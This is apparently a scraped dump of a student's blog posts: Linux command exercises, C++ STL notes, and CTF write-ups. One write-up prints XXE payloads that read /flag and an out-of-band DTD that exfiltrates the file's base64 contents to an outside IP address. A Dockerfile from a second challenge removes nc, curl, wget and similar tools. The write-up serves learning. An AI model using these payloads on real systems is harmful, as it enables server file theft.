tss:x:59:59:Account used ...... tcpdump:x:72:72::/:/sbin/nologin 管道与重定向：使用管道和重定向，将 /etc/passwd 文件中所有包含数字的行数统计出来，并重定向到一个名为 digit_count.txt 的文件中。 1 2 3 [root@localhost ~]# grep -E [0-9] /etc/passwd | wc -l \u0026gt; hello/digit_count.txt // 统计结果：44 高级系统管理 systemd：\n编写一个简单的 systemd service 文件，让一个简单的脚本（例如，一个每分钟向 /tmp/test_log.txt 文件写入当前时间的脚本）开机自启动。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //time.sh #!/bin/bash while true; do echo \u0026#34;当前时间: $(date)\u0026#34; \u0026gt;\u0026gt; /tmp/test_log.txt sleep 60 done //service [Unit] Description=定时写入时间到日志的服务 [Service] ExecStart=/home/your_username/time_script.sh Restart=always [Install] WantedBy=multi-user.target 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost ~]# sudo systemctl enable time-logger.service Created symlink from /etc/systemd/system/multi-user.target.wants/time-logger.service to /etc/syste md/system/time-logger.service. [root@localhost ~]# systemctl start time-logger.service [root@localhost ~]# systemctl status time-logger.service ● time-logger.service - 定时写入时间到日志的服务 Loaded: loaded (/etc/systemd/system/time-logger.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2025-10-17 00:48:53 PDT; 2s ago Main PID: 29493 (time_script.sh) Tasks: 2 Memory: 304.0K CGroup: /system.slice/time-logger.service ├─29493 /bin/bash /root/time_script.sh └─29497 sleep 60 [root@localhost ~]# cat /tmp/test_log.txt 当前时间: Fri Oct 17 00:48:53 PDT 2025 使用 systemctl 命令启用和启动你的服务，并验证它是否正常工作。 内核模块：\n列出系统中所有已加载的内核模块。 1 2 3 4 5 [root@localhost ~]# lsmod Module Size Used by nf_conntrack_netlink 36396 0 xt_addrtype 12676 2 ..... 尝试加载一个你了解的内核模块（例如，一个虚拟网络设备模块），然后卸载它，并验证其状态。 1 2 3 4 5 6 [root@localhost ~]# modprobe dummy [root@localhost ~]# lsmod | grep dummy dummy 12960 0 [root@localhost ~]# modprobe -r dummy [root@localhost ~]# lsmod | grep dummy [root@localhost ~]# 什么是 dummy？\n在 Linux 系统中，dummy模块是一种虚拟网络设备模块，主要有以下特点和用途：\n虚拟网络接口创建：加载dummy模块后，通过系统命令可以创建出像 dummy0、dummy1 这样的虚拟网络接口。这些接口和真实的物理网络接口类似， 可以配置 IP 地址、子网掩码等网络参数 ，也能参与网络数据包的收发模拟。 网络测试与实验：在进行网络相关的测试，比如路由策略测试、防火墙规则测试时，使用dummy虚拟网络接口非常方便。不需要依赖实际的物理网络设备，就可以构建复杂的网络拓扑结构，模拟各种网络环境。 服务绑定与隔离：某些应用场景下，需要将特定的网络服务绑定到指定的网络接口上，使用dummy接口可以实现灵活的绑定和隔离。比如，希望某个服务只在特定的 “网络通道” 上提供服务，就可以将该服务绑定到dummy接口上，便于管理和安全控制。 现代文件系统 Btrfs/ZFS 文件系统实践：\n创建文件系统与子卷：\n假设你有一个未使用的磁盘分区 /dev/sdb1。\n格式化该分区为 Btrfs 或 ZFS 文件系统。\n挂载该文件系统到一个新的目录，例如 /mnt/data。\n在 /mnt/data 下创建两个子卷，一个名为 web_data，另一个名为 database。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 由于没有磁盘分区，故用虚拟磁盘代替 [root@localhost ~]# dd if=/dev/zero of=~/virtual_disk.img bs=1G count=1 // 创建 1G * 1 的虚拟磁盘 [root@localhost ~]# losetup -f ~/virtual_disk.img [root@localhost ~]# losetup -a | grep virtual_disk.img /dev/loop0: [2051]:67154732 (/root/virtual_disk.img) // 自动映射,格式化 [root@localhost ~]# mkfs.btrfs /dev/loop0 btrfs-progs v4.9.1 See http://btrfs.wiki.kernel.org for more information. Performing full device TRIM /dev/loop0 (1.00GiB) ... ...... // 创建映射文件系统新目录并挂载 [root@localhost ~]# mkdir /mnt/data [root@localhost ~]# mount /dev/loop0 /mnt/data // 创建两个子卷 [root@localhost ~]# btrfs subvolume create /mnt/data/web_data Create subvolume \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume create /mnt/data/database Create subvolume \u0026#39;/mnt/data/database\u0026#39; [root@localhost ~]# btrfs subvolume list /mnt/data ID 256 gen 7 top level 5 path web_data ID 257 gen 8 top level 5 path database 快照与回滚：\n在 web_data 子卷中创建一个测试文件 hello.txt。\n为 web_data 子卷创建一个只读快照，命名为 snapshot_v1。\n修改 web_data 子卷中的 hello.txt 文件内容。\n验证 snapshot_v1 中的文件内容是否保持不变。\n回滚 web_data 子卷到 snapshot_v1 的状态，并验证 hello.txt 的内容是否恢复到修改前。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 创建文件 [root@localhost ~]# echo \u0026#39;helloworld 111\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt // 创建只读快照 [root@localhost ~]# btrfs subvolume snapshot -r /mnt/data/web_data /mnt/data/snapshot_v1 Create a readonly snapshot of \u0026#39;/mnt/data/web_data\u0026#39; in \u0026#39;/mnt/data/snapshot_v1\u0026#39; // 修改文件 [root@localhost ~]# echo \u0026#39;helloworld 222\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt //读快照，并未改变 [root@localhost ~]# cat /mnt/data/snapshot_v1/hello.txt helloworld 111 // 删除源文件，快照恢复 [root@localhost ~]# btrfs subvolume delete /mnt/data/web_data Delete subvolume (no-commit): \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume snapshot /mnt/data/snapshot_v1/ /mnt/data/web_data Create a snapshot of \u0026#39;/mnt/data/snapshot_v1/\u0026#39; in \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# cat /mnt/data/web_data/hello.txt helloworld 111 系统优化与维护 缓存与日志管理：\n使用 journalctl 命令查看过去 10 分钟内系统日志中所有包含“error”或“fail”关键字的条目。\n通过命令行安全地清除超过 7 天的系统日志文件，以释放磁盘空间。\n1 2 3 4 5 6 7 [root@localhost ~]# journalctl --since \u0026#34;100 minute ago\u0026#34; | grep -E \u0026#34;error|fail\u0026#34; Oct 17 00:46:03 localhost.localdomain systemd[1]: Unit time-logger.service entered failed state. Oct 17 00:46:03 localhost.localdomain systemd[1]: time-logger.service failed. ...... [root@localhost ~]# journalctl --vacuum-time=7d Vacuuming done, freed 0B of archived journals on disk. 内核参数调整：\n查看当前系统中的 TCP 最大连接数限制参数。\n临时修改该参数，将最大连接数限制提高到 50000。\n使用 sysctl -a 命令验证修改是否生效。\n1 2 3 4 5 6 7 8 9 10 [root@localhost ~]# sysctl net.core.somaxconn net.ipv4.tcp_max_syn_backlog net.core.somaxconn = 128 net.ipv4.tcp_max_syn_backlog = 256 [root@localhost ~]# sysctl -w net.core.somaxconn=50000 net.core.somaxconn = 50000 [root@localhost ~]# sysctl -a | grep -E \u0026#34;50000\u0026#34; ...... net.core.somaxconn = 50000 ...... 解释此项修改对一个高并发 Web 服务器可能带来的影响。 提高 TCP 最大连接数限制（如 net.core.somaxconn 和 net.ipv4.tcp_max_syn_backlog），对高并发 Web 服务器有以下影响：\n优化： 能够处理更多的并发 TCP 连接请求，减少因连接队列满而导致的连接建立失败情况，提升 Web 服务器的并发处理能力，让更多客户端能成功与服务器建立连接并请求资源。 问题： 会增加服务器的内存等资源消耗，因为每个连接都需要一定的内存来维护连接状态等信息。如果服务器内存等资源不足，过度提高连接数限制可能导致系统内存紧张，甚至出现内存溢出等问题，反而影响服务器的稳定运行。 ","date":"2025-10-17T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E8%BF%9B%E9%98%B6/","title":"御林招新题：Linux 进阶"},{"content":"获得一个Linux操作系统 服务器 + 云服务器均尝试，已完成。\n命令基础 登录Linux系统，更改自己的用户口令 1 2 3 4 5 [root@localhost ~]# passwd Changing password for user root. New password: Retype new password: passwd: all authentication tokens updated successfully. 执行常用的Linux命令 1 2 3 4 5 [root@localhost ~]# ls anaconda-ks.cfg original-ks.cfg [root@localhost ~]# mkdir hello [root@localhost ~]# cd .. ... 使用 man 命令，来查找特定命令的帮助信息 。 man ls 文件与目录 显示和改变当前目录 。 1 2 3 [root@localhost /]# pwd / [root@localhost /]# cd home 使用 ls 命令的不同选项来查看文件与目录的属性 。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [root@localhost /]# ls -l total 24 lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4096 Sep 28 16:34 boot drwxr-xr-x. 19 root root 3260 Oct 16 03:17 dev ...... [root@localhost /]# ls -lh total 24K lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4.0K Sep 28 16:34 boot drwxr-xr-x. 19 root root 3.2K Oct 16 03:17 dev ...... [root@localhost /]# ls -t root etc tmp run dev sys proc opt boot ... [root@localhost /]# ls -a . bin dev home lib64 mnt proc run srv tmp var .. boot etc lib media opt root sbin sys usr 创建和删除目录 。 1 2 [root@localhost /]# mkdir test [root@localhost /]# rmdir test 创建零长度的文件 。\ntouch test.txt 拷贝、移动、重命名、链接及删除文件 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 [root@localhost /]# mkdir test [root@localhost /]# rmdir test [root@localhost /]# touch test.txt [root@localhost /]# cp test.txt test_cp.txt [root@localhost /]# mv test.txt text_rename.txt [root@localhost /]# ln test_cp.txt test_cp_hardlink.txt [root@localhost /]# ln -s test_cp test_cp_hardlink.txt test_cp.txt [root@localhost /]# ln -s test_rename_softlink.txt [root@localhost /]# rm test* rm: remove regular empty file ‘test_cp_hardlink.txt’? y rm: remove regular empty file ‘test_cp.txt’? y rm: remove symbolic link ‘test_rename_softlink.txt’? y 软链接：适合需要跨分区或对目录建立快捷方式的场景。 硬链接：适合在同一分区内共享文件内容且不希望因删除源文件而失效的场景。 查看文件内容 。 1 2 [root@localhost /]# cat bin cat: bin: Is a directory 修改文件和目录权限 使用长列表命令来查看文件与目录的信息 1 2 3 4 5 6 7 [root@localhost test]# mkdir test1 [root@localhost test]# touch test.txt [root@localhost test]# echo \u0026#34;hello\u0026#34; \u0026gt;\u0026gt; test.txt [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -rw-r--r--. 1 root root 6 Oct 16 03:44 test.txt -rw-r--r-- ,共 10 个字符：\n第 1 位：文件类型（- 普通文件，d 目录，l 链接）\n第 2-4 位：所有者（User）权限\n第 5-7 位：所属组（Group）权限\n第 8-10 位：其他用户（Others）权限\n权限字符：\nr (Read)：读取权限（4） w (Write)：写入权限（2） x (Execute)：执行权限（1） -：无对应权限（0） 对普通文件与目录的权限进行操作 格式：chmod [用户][操作][权限] 文件名\n用户：u(所有者)、g(所属组)、o(其他)、a(所有) 操作：+(添加)、-(移除)、=(设置) 1 2 3 4 [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -r--r--r--. 1 root root 6 Oct 16 03:44 test.txt vi 编辑器 创建一个文件 。vi filename\n保存并退出一个文件及不保存退出一个文件 。\n命令模式下，:wq 保存退出，:q! 直接退出\n在文本中使用不同的键进行光标的移动 。 上下左右：kjhl\n单词：w 移动到下一个单词开头；b 移动到上一个单词开头\n行首 ^，行尾 $\n文首 gg ,文尾 G\n在一个文件中加入、删除与修改文本 。 新增 光标前：i 行首I\n光标后：a 行尾A\n下一行：o 上一行O\n删除 所在字符：nx\n所在行：ndd\n到行首 d^ 到行尾 d$\n修改 当前字符：r\n到行尾：R\n设定选项以自定义编辑环境 。 :set number 设置行号\n调用命令行编辑功能 。 :!command 执行\n替换：:%s/old/new/g（old 为要替换的旧内容，new 为新内容，% 表示整个文件，g 表示全局替换）\n查找：/pattern，n下一个，N上一个\n文件操作进阶 通配符应用：在 /usr/bin 目录下，使用通配符查找所有以字母 a 开头的文件名，并仅列出文件名。 1 2 3 4 [root@localhost bin]# ls a* a2p abrt-merge-pstoreoops appstream-compose abrt-action-analyze-backtrace abrt-retrace-client appstream-util ... 查找文件：在 /tmp 目录中找到所有文件名。 1 2 [root@localhost bin]# find /tmp -type f -printf \u0026#34;%f\\n\u0026#34; .X0-lock 文件内容排序：将 /etc/passwd 文件中的内容按字母顺序和逆序分别显示。 1 2 3 4 5 6 7 8 [root@localhost tmp]# sort /etc/passwd abrt:x:173:173::/etc/abrt:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin ... [root@localhost tmp]# sort -r /etc/passwd usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:991:986:Unbound DNS resolver:/etc/unbound:/sbin/nologin ... 头部和尾部显示：显示 /etc/passwd 文件的前5行和后10行的内容。 1 2 3 4 5 6 7 8 9 [root@localhost tmp]# head -n 5 /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@localhost tmp]# tail -n 10 /etc/passwd ...... 文件权限进阶 软链接与硬链接：在你的用户主目录下，为 /usr/bin/cat 文件分别创建软链接和硬链接，并解释两者的区别。 见上\n权限恢复：如何将某个目录的权限恢复到默认的 rwxr-xr-x 形式？请使用两种不同的 chmod 语法来实现。 1 2 [root@localhost test]# chmod u=rwx,g=rx,o=rx test1 [root@localhost test]# chmod 755 test1 r-4 ; w-2 ; x-1\nvi 编辑器进阶 复制与粘贴：在 vi 中，一次性将一段文本（例如三行）复制到文件的末尾。 命令行 nyy 复制n行\n命令行 p 粘贴\n撤销与重做：掌握在 vi 中撤销（undo）和重做（redo）操作的方法。 撤销：u\n重做：ctrl+r\n","date":"2025-10-16T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E5%85%A5%E9%97%A8/","title":"御林招新题：DevOps-Linux入门"},{"content":"题干 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;img src=\u0026#34;...\u0026#34; alt=\u0026#34;雪王Logo\u0026#34; class=\u0026#34;logo\u0026#34;\u0026gt;雪王生擒明珠塔\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mission\u0026#34;\u0026gt;帮助雪王，向东方明珠塔的护盾发送特殊信号，找到藏在塔内的旗帜/flag。\u0026lt;/p\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;div class=\u0026#34;input-area\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;payloadInput” class=\u0026#34;input-label\u0026#34;\u0026gt;在此进行你的攻击：\u0026lt;/label\u0026gt; \u0026lt;textarea id=\u0026#34;payloadInput\u0026#34; rows=\u0026#34;12\u0026#34; placeholder=\u0026#34;Enter your payload here...\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button onclick=\u0026#34;submitProposal()\u0026#34; class=\u0026#34;attack-button\u0026#34;\u0026gt;发起总攻\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;response-message” class=\u0026#34;response-area\u0026#34;\u0026gt;等待指令...\u0026lt;/div\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;雪王安全实验室 \u0026amp;copy；2025\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 在输入框中攻击？ 尝试 抓包如图：\n了解到可能是 xxe 漏洞\nXML 的知识 基本结构：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!--XML声明--\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!--DTD，这部分可选的--\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///c:/windows/win.ini\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;!--文档元素--\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; DTD 外部（.dtd 文件）和内部 DTD\n声明方式如下：\n内部实体 1 2 3 4 5 \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY a \u0026#34;admin\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;a\u0026lt;/note\u0026gt; \u0026lt;!-- admin --\u0026gt; 参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % b \u0026#34;\u0026lt;!ENTITY b1 \u0026#34;awsl\u0026#34;\u0026gt;\u0026#34;\u0026gt; %b; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;b1\u0026lt;/note\u0026gt; 外部实体 1 2 3 4 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY c SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=flag.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;c\u0026lt;/note\u0026gt; 支持http，file等协议，不同的语言支持的协议不同\n外部参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % d SYSTEM \u0026#34;http://47.106.143.26/xml.dtd\u0026#34;\u0026gt; %d; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;d1\u0026lt;/note\u0026gt; 1 2 \u0026lt;!-- http://47.106.143.26/xml.dtd --\u0026gt; \u0026lt;!ENTITY d1 SYSTEM \u0026#34;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==\u0026#34;\u0026gt; 继续题目 尝试直接引入外部实体： 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY rabbit SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;rabbit;\u0026lt;/username\u0026gt;\u0026lt;/user\u0026gt; 响应：\n为什么不行？\n尝试引入服务器外部实体、外带： payload：\n1 2 3 4 5 \u0026lt;!DOCTYPE hacker[ \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % myurl SYSTEM \u0026#34;http://8.137.145.223/evil.dtd\u0026#34;\u0026gt; %myurl; ]\u0026gt; evil.dtd：\n1 2 3 \u0026lt;!ENTITY % wrapper \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; send SYSTEM \u0026#39;http://8.137.145.223/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %wrapper; %send; python3 -m http.server 8000\n测试外网可以正常访问，改包重发：\n还是不行，为什么？\n解决 最后发现问题在于，默认访问的是 80 端口！！！而启动服务器的时候启动了 8000……\n服务器：\nbp:\n终于！！\n一些启示 先搜集信息定方向，然后具体学习相关知识 总是有一些奇怪的错误，定位到知识上去解决，不要乱试 ","date":"2025-10-15T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/","title":"御林招新题：雪王生擒明珠塔"},{"content":"模板 建立通用的模具，提高复用性\n函数模板 作用：\n建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个虚拟的类型来代表。 支持自动类型推导和显式指定类型 1 2 3 4 5 6 7 8 9 //函数模板 template\u0026lt;typenameT\u0026gt;//声明一个模板，告诉编译器后面代码中紧跟着的T不要报错，T是一个通用数据类型 void mySwap(T \u0026amp;a,T \u0026amp;b) { T temp = a; a=b; b = temp; } myswap\u0026lt;int\u0026gt;(a,b) 注意：\n自动类型推导，必须推导出一致的数据类型T，才可以使用 模板必须要确定出 T 的数据类型，才可以使用（不能不推导） 普通函数和模板函数的区别 普通函数调用时可以发生自动类型转换（隐式类型转换） 函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换 调用规则：\n优先调用普通函数 可通过空模板参数列表来强制调用函数模板 函数模板也可以发生重载 如果函数模板可以产生更好的匹配，优先周用函数模板 局限性 需要为特定的类型（如数组、自定义对象等）提供具体化模板\n1 2 3 4 5 6 7 8 9 10 template\u0026lt;\u0026gt;bool myCompare (Person \u0026amp;p1, Person \u0026amp;p2) { if(p1.name == p2.name){ return true; } else { return false; } } 类模板 1 2 teplate\u0026lt;typename T\u0026gt; class ... 与函数模板的区别 没有自动类型推导 可以有默认参数类型 成员函数创建时机 在模板调用（可以确定类型）时，才创建\n类模板对象作参数 指定传入类型 参数模板化 对象中的参数变为模板进行传递 整个类模板化 类模板与继承 类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型\n若不指定，编译器无法给子类分配内存 如果想灵活指定出父类中T的类型，子类也需变为类模板\n类模板成员的类外实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //构造函数类外实现 template\u0026lt;class T1,class T2\u0026gt; Person\u0026lt;T1, T2\u0026gt;::Person(T1 name, T2 age) { this-\u0026gt;m_Name = name; this-\u0026gt;m_Age = age; } //成员函数类外实现 template\u0026lt;class T1, class T2\u0026gt; void Person\u0026lt;T1, T2\u0026gt;::showPerson() { } 类模板分文件编写 问题：\n模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到 解决：\n解决方式1：直接包含.cpp源文件 解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制 类模板与友元 类内实现：直接在类内声明友元即可\n类外实现：需要提前让编译器知道全局函数的存在\nSTL 初识 Standard Template Library：标准模板库\n主要组件：容器、算法、迭代器 容器和算法通过迭代器连接 STL 采用模板实现 六大组件：容器、算法、迭代器、仿函数、适配器（配接器）、空间配置器\n容器：数据结构 序列式：强调值的排序 关联式：如树，没有严格的物理联系 算法 Algorithms：实现常用算法 质变：与原来不同 非质变：查找、计数、遍历等 迭代器：胶合容器和算法 类似指针，提供访问容器的接口 双向、随机访问 仿函数：行为类似函数，可所谓算法的某种策略 适配器（配接器）：用于修饰容器、算法、迭代器或接口 空间配置器：负责空间的配置和管理 vector 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;vector\u0026gt; vector\u0026lt;int\u0026gt; v; v.pushback() v.begin(); // 返回迭代器，指向容器中第一个数据 v.end(); // 指向容器最后一个数据的下一个位置 vector\u0026lt;int\u0026gt;::iterator pBegin = v.begin() // 接收 //第一种遍历方式: while (pBegin != pEnd) { cout \u0026lt;\u0026lt; *pBegin \u0026lt;\u0026lt; endl; pBegin++; } //第二种遍历方式: for (vector\u0026lt;int\u0026gt;::iterator it = v.begin(); it != v.end(); it++) { cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; endl; } cout \u0026lt;\u0026lt; endl; //第三种遍历方式: //使用STL提供标准遍历算法 头文件 algorithm for_each(v.begin(), v.end(), MyPrint); String string 是 C++ 风格的字符串，本质是一个类\n类内部封装 char*，是管理 char* 的容器 构造函数 1 2 3 4 string();//创建一个空的字符串例如：stringstr; string(const chan* s);//使用字符串s初始化 string(const string\u0026amp; str）;//使用一个string对象初始化另一个string对象 string(Int n, char c);//使用n个字符c初始化 赋值 1 2 3 4 5 6 7 string\u0026amp; operator=(const char*s);//char*类型字符串赋值给当前的字符串 string\u0026amp; operator=(const string \u0026amp;s）;//把字符串s赋给当前的字符串 string\u0026amp; operator=(char c);//字符赋值给当前的字符串 string\u0026amp; assign(const char *s);//把字符串s赋给当前的字符串 string\u0026amp; assign(const char *s,int n);//把字符串s的前n个字符赋给当前的字符串 string\u0026amp; assign(const string \u0026amp;s);//把字符串s赋给当前字符串 string\u0026amp; assign(int n,char c);//用n个字符c赋给当前字符串 拼接 1 2 3 4 5 6 7 string\u0026amp; operator+=(const char*str);//重载+=操作符 string\u0026amp; operator+=(const char c);//重载+=操作符 string\u0026amp; operator+=(const string\u0026amp; str);//重载+=操作符 string\u0026amp; appnd(const char *s);//把字符串s连接到当前字符串结尾 string\u0026amp; append(const char *s,int n);//把字符串s的前n个字符连接到当前字符串结尾 string\u0026amp; append(const string \u0026amp;s);//同operator+=(const string\u0026amp;str) string\u0026amp;append(conststring\u0026amp;s，intpos，intn);/字符串s中从pos开始的n个字符连接到字符串结尾 查找、替换 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 查找 str 第一次出现位置，从 pos 开始查找 int find(const string\u0026amp; str, int pos = 0) const; // 查找 s 第一次出现位置，从 pos 开始查找 int find(const char* s, int pos = 0) const; // 从 pos 位置查找 s 的前 n 个字符第一次位置 int find(const char* s, int pos, int n) const; // 查找字符 c 第一次出现位置 int find(const char c, int pos = 0) const; // 查找 str 最后一次位置，从 pos 开始查找 int rfind(const string\u0026amp; str, int pos = npos) const; // 查找 s 最后一次出现位置，从 pos 开始查找 int rfind(const char* s, int pos = npos) const; // 从 pos 查找 s 的前 n 个字符最后一次位置 int rfind(const char* s, int pos, int n) const; // 查找字符 c 最后一次出现位置 int rfind(const char c, int pos = 0) const; // 替换从 pos 开始 n 个字符为字符串 str string\u0026amp; replace(int pos, int n, const string\u0026amp; str); // 替换从 pos 开始的 n 个字符为字符串 s string\u0026amp; replace(int pos, int n, const char* s); 比较 1 2 int compare(const string\u0026amp; s)const; //与字符串s比较 int compare(const char *s) const;//与字符串s比较 字符存取 1 2 char\u0026amp; operator[] (int n);//通过[方式取字符 char\u0026amp; at(int n);//通过at方法获取字符 插入、删除 1 2 3 4 string\u0026amp; insert(int pos, const char*s);//插入字符串 string\u0026amp; insert(int pos,const string\u0026amp; str);//插入字符串 string\u0026amp; insert(int pos,int n,char c);//在指定位置插入n个字符c string\u0026amp; erase(int pos,int n = npos);//删除从Pos开始的n个字符 截取 1 string substr(int pos=θ,int = npos)const; vector 据结构和数组非常相似，也称为单端数组\n数组是静态空间，而 vector 可以动态扩展 动态扩展：不是在原空间之后续接新空间，而是找更大的内存空间，然后将原数据拷贝新空间，释放原空间 构造 1 2 3 4 vector\u0026lt;T\u0026gt;v;//采用模板实现类实现，默认构造函数 vector(v.begin(),v.end());//将v[begin(),end()区间中的元素拷贝给本身。 vector(n,elem);//构造函数将n个elem拷贝给本身。 vector(const vector \u0026amp;vec);//拷贝构造函数。 赋值 1 2 3 vector\u0026amp; operator=(const vector \u0026amp;vec);//重载等号操作符 assign(beg,end);//将[beg，end)区间中的数据拷贝赋值给本身。 assign(n,elem);//将n个elem拷贝赋值给本身。 容量 1 2 3 4 5 6 7 empty();//判断容器是否为空 capacity();//容器的容量 size();//返回容器中元素的个数 resize(int num);//重新指定容器的长度为num，若容器变长，则以默认值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除。 resize（intnum，elem)；//重新指定容器的长度为num，若容器变长，则以elem值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除 插入、删除 1 2 3 4 5 6 7 push_back(ele);//尾部插入元素ele pop_back();//删除最后一个元素 insert(const_iterator pos,ele);//选代器指向位置pos插入元素ele insert(const_iteratorpos，intcount，ele);//迭代器指向位置pos插入count个元素ele erase(const_iterator pos);//删除选代器指向的元素 erase(const_iteratorstart，const_iteratorend);//删除迭代器从start到end之间的元素 clear();//删除容器中所有元素 存取 1 2 3 4 at(int idx);//返回索引lidx所指的数据 operator[];//返回索引lidx所指的数据 front();//返回容器中第一个数据元素 back();//返回容器中最后一个数据元素 呼唤 swap(vec)\n收缩空间：vector\u0026lt;int\u0026gt;(v).swap(v)\n匿名对象自动被回收 预留空间 reserve(int len)\n分配内存，但内存上数据并未初始化，不可访问 用于减少开辟空间次数 ","date":"2025-10-14T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-c++%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%E5%8F%8Astl%E6%8A%80%E6%9C%AF/","title":"C++ 模板及STL技术"},{"content":"题干 附件：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#39;3.8\u0026#39; services: ipv4-challenge-challenge: build: . ports: - \u0026#34;5000:5000\u0026#34; volumes: - ./server.py:/app/server.py environment: - PYTHONUNBUFFERED=1 restart: always networks: default: driver: bridge dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 FROM python:3.9-alpine RUN apk add --no-cache bash procps RUN rm -f /bin/cat /bin/ls /usr/bin/cat /usr/bin/ls /usr/bin/nc /usr/bin/curl /usr/bin/wget /usr/bin/id /usr/bin/whoami WORKDIR /app COPY server.py . COPY templates ./templates COPY flag.txt /flag RUN pip install Flask EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;server.py\u0026#34;] server.py: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 app = Flask(__name__, template_folder=\u0026#39;templates\u0026#39;) 